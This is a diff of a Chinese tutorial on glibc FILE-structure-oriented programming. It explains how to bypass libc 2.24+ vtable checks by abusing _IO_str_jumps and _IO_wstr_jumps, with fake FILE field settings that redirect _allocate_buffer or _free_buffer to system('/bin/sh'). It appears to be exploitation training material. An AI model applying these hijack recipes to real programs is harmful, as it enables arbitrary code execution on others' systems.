@@ -1032,9 +1032,7 @@ fp -> \_mode 字段是用来判断当前文件流指针是否使用了宽字节�
 	payload += p64(vtalbe)
 	payload += p64(0)*2 + p64(system_addr) + p64(system_addr)
 
-## 5.2 基于finish的FSOP利用技术 ##
-该利用方法其实就是利用了在关闭文件流指针时（调用\_IO\_new\_fclose），最终会调用vtable函数列表中\_\_finish函数这一特性，具体源代码在章节4，这里不再赘述。
-## 5.3 FSOP防御机制 ##
+## 5.2 FSOP防御机制 ##
 从libc2.24开始，加入了对于vtable的检查函数，即在<a href = "#6">2.3小节</a>提到的IO\_validata\_vtable和\_IO\_vtable\_check两个函数。
 <pre class="prettyprint lang-javascript"> 
 static inline const struct _IO_jump_t *
@@ -1091,66 +1089,212 @@ _IO_vtable_check (void)
 
 该函数大体意思为：如果定义了SHARED，则需要检查是否设定了接受外来vtables。如果是则直接返回，除此之外还会检查是否设置了\_dl\_open\_hook结构体，或者该libc副本不在缺省的命名空间内。  
 
-由此可以想到两种绕过方法：
-1. 修改IO\_accept\_foreign\_vtables全局变量
-## 5.4 绕过 ##
-## 5.5  ##
-<pre class="prettyprint lang-javascript">
-int _IO_str_overflow (_IO_FILE *fp, int c)
-{
-	int flush_only = c == EOF;		//EOF = -1
-	_IO_size_t pos;
-	if (fp->_flags & _IO_NO_WRITES)		//如果当前fp的flag字段标志了该流不可写
-		return flush_only ? 0 : EOF;
-	if ((fp->_flags & _IO_TIED_PUT_GET) && !(fp->_flags & _IO_CURRENTLY_PUTTING))
+## 5.3 绕过FSOP防御机制 ##
+从libc2.24开始，libc加入了针对文件流虚表（vtable）的检测机制。下面介绍针对该检测机制的两种绕过方法。
+### 5.3.1 利用\_IO\_str\_jumps ###
+由于在新的检测机制下，会检查虚表的地址是否在规定的合法范围内，因此我们无法再伪造vtable结构。既然无法将 vtable 指针指向 \_\_libc\_IO\_vtables 以外的地方，那么就在 \_\_libc\_IO\_vtables 里面找些有用的东西。比如 \_IO\_str\_jumps（该符号在strip后会丢失），但我们可以根据\_IO\_file\_jumps以及相对偏移（一般来说为0xc0，但具体使用时还需要视情况而定）来计算它的相对位置。
+
+下面是\_IO\_str\_jumps虚表结构体的相关成员
+
+	// libio/strops.c
+
+	#define JUMP_INIT_DUMMY JUMP_INIT(dummy, 0), JUMP_INIT (dummy2, 0)
+
+	const struct _IO_jump_t _IO_str_jumps libio_vtable =
 	{
-		fp->_flags |= _IO_CURRENTLY_PUTTING;
-		fp->_IO_write_ptr = fp->_IO_read_ptr;
-		fp->_IO_read_ptr = fp->_IO_read_end;
-	}
-	pos = fp->_IO_write_ptr - fp->_IO_write_base;
-	if (pos >= (_IO_size_t) (_IO_blen (fp) + flush_only))
+	  JUMP_INIT_DUMMY,
+	  JUMP_INIT(finish, _IO_str_finish),
+	  JUMP_INIT(overflow, _IO_str_overflow),
+	  JUMP_INIT(underflow, _IO_str_underflow),
+	  JUMP_INIT(uflow, _IO_default_uflow),
+	  JUMP_INIT(pbackfail, _IO_str_pbackfail),
+	  JUMP_INIT(xsputn, _IO_default_xsputn),
+	  JUMP_INIT(xsgetn, _IO_default_xsgetn),
+	  JUMP_INIT(seekoff, _IO_str_seekoff),
+	  JUMP_INIT(seekpos, _IO_default_seekpos),
+	  JUMP_INIT(setbuf, _IO_default_setbuf),
+	  JUMP_INIT(sync, _IO_default_sync),
+	  JUMP_INIT(doallocate, _IO_default_doallocate),
+	  JUMP_INIT(read, _IO_default_read),
+	  JUMP_INIT(write, _IO_default_write),
+	  JUMP_INIT(seek, _IO_default_seek),
+	  JUMP_INIT(close, _IO_default_close),
+	  JUMP_INIT(stat, _IO_default_stat),
+	  JUMP_INIT(showmanyc, _IO_default_showmanyc),
+	  JUMP_INIT(imbue, _IO_default_imbue)
+	};
+\_IO\_strfile结构体
+
+	struct _IO_str_fields
 	{
-		if (fp->_flags & _IO_USER_BUF) /* not allowed to enlarge */
-			return EOF;
-		else
-		{
-			char *new_buf;
-			char *old_buf = fp->_IO_buf_base;
-			size_t old_blen = _IO_blen (fp);
-			_IO_size_t new_size = 2 * old_blen + 100;
-			if (new_size < old_blen)
+	  _IO_alloc_type _allocate_buffer;		//函数指针
+	  _IO_free_type _free_buffer;			//函数指针
+	};
+	
+	struct _IO_streambuf
+	{
+	  struct _IO_FILE _f;
+	  const struct _IO_jump_t *vtable;
+	};
+	
+	typedef struct _IO_strfile_
+	{
+	  struct _IO_streambuf _sbf;
+	  struct _IO_str_fields _s;		//虚表
+	} _IO_strfile;
+在这个vtable中有两个函数我们可以拿来利用，\_IO_str\_overflow和\_IO\_str\_finish。
+
+#### 5.3.1.1 \_IO\_str\_overflow利用方法 ####
+其中\_IO\_str\_overflow代码如下所示：
+
+	int _IO_str_overflow (_IO_FILE *fp, int c)
+	{
+	  int flush_only = c == EOF;
+	  _IO_size_t pos;
+	  if (fp->_flags & _IO_NO_WRITES)
+	      return flush_only ? 0 : EOF;
+	  if ((fp->_flags & _IO_TIED_PUT_GET) && !(fp->_flags & _IO_CURRENTLY_PUTTING))
+	  {
+	      fp->_flags |= _IO_CURRENTLY_PUTTING;
+	      fp->_IO_write_ptr = fp->_IO_read_ptr;
+	      fp->_IO_read_ptr = fp->_IO_read_end;
+	  }
+	  pos = fp->_IO_write_ptr - fp->_IO_write_base;
+	  if (pos >= (_IO_size_t) (_IO_blen (fp) + flush_only))  // 条件 #define _IO_blen(fp) ((fp)->_IO_buf_end - (fp)->_IO_buf_base)
+	  {
+	      if (fp->_flags & _IO_USER_BUF) /* not allowed to enlarge */
 				return EOF;
-			new_buf = (char *) (*((_IO_strfile *) fp)->_s._allocate_buffer) (new_size);
-			if (new_buf == NULL)
-			{
-				/*	  __ferror(fp) = 1; */
-				return EOF;
-			}
-			if (old_buf)
-			{
-				memcpy (new_buf, old_buf, old_blen);
-				(*((_IO_strfile *) fp)->_s._free_buffer) (old_buf);
-				/* Make sure _IO_setb won't try to delete _IO_buf_base. */
-				fp->_IO_buf_base = NULL;
-			}
-			memset (new_buf + old_blen, '\0', new_size - old_blen);
-			
-			_IO_setb (fp, new_buf, new_buf + new_size, 1);
-			fp->_IO_read_base = new_buf + (fp->_IO_read_base - old_buf);
-			fp->_IO_read_ptr = new_buf + (fp->_IO_read_ptr - old_buf);
-			fp->_IO_read_end = new_buf + (fp->_IO_read_end - old_buf);
-			fp->_IO_write_ptr = new_buf + (fp->_IO_write_ptr - old_buf);
-			
-			fp->_IO_write_base = new_buf;
-			fp->_IO_write_end = fp->_IO_buf_end;
-		}
+	      else
+		  {
+				char *new_buf;
+		  		char *old_buf = fp->_IO_buf_base;
+		  		size_t old_blen = _IO_blen (fp);
+		  		_IO_size_t new_size = 2 * old_blen + 100;      // 通过计算 new_size 为 "/bin/sh\x00" 的地址
+		  		if (new_size < old_blen)
+		    		return EOF;
+		  		new_buf = (char *) (*((_IO_strfile *) fp)->_s._allocate_buffer) (new_size);     // 在这个相对地址放上 system 的地址，即 system("/bin/sh")
+	    [...]
+因此我们可以下面的方式对fp指针进行构造：
+所以可以像下面这样构造：
+
+    fp->_flags = 0
+    fp->_IO_buf_base = 0
+    fp->_IO_buf_end = (bin_sh_addr - 100) / 2
+    fp->_IO_write_ptr = 0xffffffff
+    fp->_IO_write_base = 0
+    fp->_mode = 0
+此时，根据代码所示可以推导出如下等式：  
+old\_blen = \_IO\_blen(fp) = fp->\_IO\_buf\_end - \_IO\_buf\_base = \_IO\_buf\_end  
+new\_size = 2 * old\_blen +100 = 2*\_IO\_buf\_end + 100 = (bin\_sh\_addr - 100）/ 2 * 2 + 100 = bin\_sh\_addr  
+这样我们就布置好了system函数需要调用的参数，接下来就是如何控制程序执行流程了。
+
+我们注意到在\_IO\_str\_overflow函数中有这样一行代码
+
+	new_buf = (char *) (*((_IO_strfile *) fp)->_s._allocate_buffer) (new_size); 
+可以看到在该函数中有一个虚表调用，调用的函数地址为相对fp偏移0xe0（64bit）的\_allocate\_buffer函数，如果我们把该地址的内容替换为system函数，不就可以劫持程序控制流了吗？确实如此！我们只要在fp+0xe0的位置放置system函数的指针即可劫持控制流。  
+**有一点要注意的是，如果 bin\_sh\_addr 的地址以奇数结尾，为了避免除法向下取整的干扰，可以将该地址加 1。另外 system("/bin/sh") 是可以用 one\_gadget 来代替的，这样似乎更加简单。**
+
+利用\_IO\_str\_overflow的完成调用过程（还有其他的利用路径，本文只列出了针对malloc\_printerr的情况）：
+
+	malloc_printerr -> __libc_message -> __GI_abort -> _IO_flush_all_lockp -> __GI__IO_str_overflow
+#### 5.3.1.2 \_IO\_str\_finish利用方法 ####
+在vtable中还有另一个函数可以利用，就是\_IO\_str\_finish，该函数的利用方式较为简单，下面我们先看看该函数的代码。
+
+	void _IO_str_finish (_IO_FILE *fp, int dummy)
+	{
+	  if (fp->_IO_buf_base && !(fp->_flags & _IO_USER_BUF))             // 条件
+	    (((_IO_strfile *) fp)->_s._free_buffer) (fp->_IO_buf_base);     // 在这个相对地址放上 system 的地址
+	  fp->_IO_buf_base = NULL;
+	
+	  _IO_default_finish (fp, 0);
 	}
-	if (!flush_only)
-		*fp->_IO_write_ptr++ = (unsigned char) c;
-	if (fp->_IO_write_ptr > fp->_IO_read_end)
-		fp->_IO_read_end = fp->_IO_write_ptr;
-	return c;
-}
-libc_hidden_def (_IO_str_overflow)
-</pre>
+我们只要让 fp->\_IO\_buf\_base 等于"/bin/sh" 的地址，然后设置 fp->_flags = 0 就可以了绕过函数里的条件。
+
+接下来的关键就是如何控制程序执行流程到\_IO\_str\_finish。一个显而易见的方法为调用fclose函数，但这用方法有局限性，不是每个程序都会调用fclose。那么还有没有一条其他的路径呢？答案是有！，我们还是利用异常处理。
+
+通过前面对\_IO\_flush\_all\_lockp 函数的分析，我们知道该函数最终会调用 \_IO\_OVERFLOW执行 \_\_GI\_\_IO\_str\_overflow，而 \_IO\_OVERFLOW 是根据 \_\_overflow 相对于 \_IO\_str\_jumps vtable 的偏移（64bit，offset = 0x18）找到具体函数的。所以如果我们伪造传递给 \_IO\_OVERFLOW(fp) 的 fp->vtable 为 \_IO\_str\_jumps 减去 0x8，那么根据偏移（+0x18），程序将找到 \_IO\_str\_finish (\_IO\_str\_jumps - 0x8 + 0x18 = \_IO\_str\_jumps + 0x10）并执行。
+
+所以可以像下面这样构造：
+
+    fp->_mode = 0
+    fp->_IO_write_ptr = 0xffffffff
+    fp->_IO_write_base = 0
+    fp->_IO_buf_base = bin_sh_addr
+
+完整的调用过程：
+
+	malloc_printerr -> __libc_message -> __GI_abort -> _IO_flush_all_lockp -> __GI__IO_str_finish
+
+### 5.3.2 利用\_IO\_wstr\_jumps ###
+\_IO\_wstr\_jumps 也是一个符合条件的 vtable，总体上和上面讲的 \_IO\_str\_jumps 差不多。
+
+\_IO\_wstr\_jumps虚表结构如下所示：
+
+	// libio/wstrops.c
+	
+	const struct _IO_jump_t _IO_wstr_jumps libio_vtable =
+	{
+	  JUMP_INIT_DUMMY,
+	  JUMP_INIT(finish, _IO_wstr_finish),
+	  JUMP_INIT(overflow, (_IO_overflow_t) _IO_wstr_overflow),
+	  JUMP_INIT(underflow, (_IO_underflow_t) _IO_wstr_underflow),
+	  JUMP_INIT(uflow, (_IO_underflow_t) _IO_wdefault_uflow),
+	  JUMP_INIT(pbackfail, (_IO_pbackfail_t) _IO_wstr_pbackfail),
+	  JUMP_INIT(xsputn, _IO_wdefault_xsputn),
+	  JUMP_INIT(xsgetn, _IO_wdefault_xsgetn),
+	  JUMP_INIT(seekoff, _IO_wstr_seekoff),
+	  JUMP_INIT(seekpos, _IO_default_seekpos),
+	  JUMP_INIT(setbuf, _IO_default_setbuf),
+	  JUMP_INIT(sync, _IO_default_sync),
+	  JUMP_INIT(doallocate, _IO_wdefault_doallocate),
+	  JUMP_INIT(read, _IO_default_read),
+	  JUMP_INIT(write, _IO_default_write),
+	  JUMP_INIT(seek, _IO_default_seek),
+	  JUMP_INIT(close, _IO_default_close),
+	  JUMP_INIT(stat, _IO_default_stat),
+	  JUMP_INIT(showmanyc, _IO_default_showmanyc),
+	  JUMP_INIT(imbue, _IO_default_imbue)
+	};
+
+	_IO_wint_t _IO_wstr_overflow (_IO_FILE *fp, _IO_wint_t c)
+	{
+	  int flush_only = c == WEOF;
+	  _IO_size_t pos;
+	  if (fp->_flags & _IO_NO_WRITES)
+	      return flush_only ? 0 : WEOF;
+	  if ((fp->_flags & _IO_TIED_PUT_GET) && !(fp->_flags & _IO_CURRENTLY_PUTTING))
+	  {
+	      fp->_flags |= _IO_CURRENTLY_PUTTING;
+	      fp->_wide_data->_IO_write_ptr = fp->_wide_data->_IO_read_ptr;
+	      fp->_wide_data->_IO_read_ptr = fp->_wide_data->_IO_read_end;
+	  }
+	  pos = fp->_wide_data->_IO_write_ptr - fp->_wide_data->_IO_write_base;
+	  if (pos >= (_IO_size_t) (_IO_wblen (fp) + flush_only))    // 条件 #define _IO_wblen(fp) ((fp)->_wide_data->_IO_buf_end - (fp)->_wide_data->_IO_buf_base)
+	  {
+	      if (fp->_flags2 & _IO_FLAGS2_USER_WBUF) /* not allowed to enlarge */
+				return WEOF;
+	      else
+		  {
+		  		wchar_t *new_buf;
+		  		wchar_t *old_buf = fp->_wide_data->_IO_buf_base;
+		  		size_t old_wblen = _IO_wblen (fp);
+		  		_IO_size_t new_size = 2 * old_wblen + 100;              // 使 new_size * sizeof(wchar_t) 为 "/bin/sh" 的地址
+	
+		  		if (__glibc_unlikely (new_size < old_wblen)
+		      		|| __glibc_unlikely (new_size > SIZE_MAX / sizeof (wchar_t)))
+		    		return EOF;
+	
+		  		new_buf = (wchar_t *) (*((_IO_strfile *) fp)->_s._allocate_buffer) (new_size * sizeof (wchar_t));    // 在这个相对地址放上 system 的地址
+	    [...]
+其他的都没有发生变化，唯一需要注意的就是其中条件判断的字段都变为了fp->\_wide_data字段。  
+
+利用函数 \_IO\_wstr\_finish：
+
+	void _IO_wstr_finish (_IO_FILE *fp, int dummy)
+	{
+	  if (fp->_wide_data->_IO_buf_base && !(fp->_flags2 & _IO_FLAGS2_USER_WBUF))    // 条件
+	    (((_IO_strfile *) fp)->_s._free_buffer) (fp->_wide_data->_IO_buf_base);     // 在这个相对地址放上 system 的地址
+	  fp->_wide_data->_IO_buf_base = NULL;
+	
+	  _IO_wdefault_finish (fp, 0);
+	}
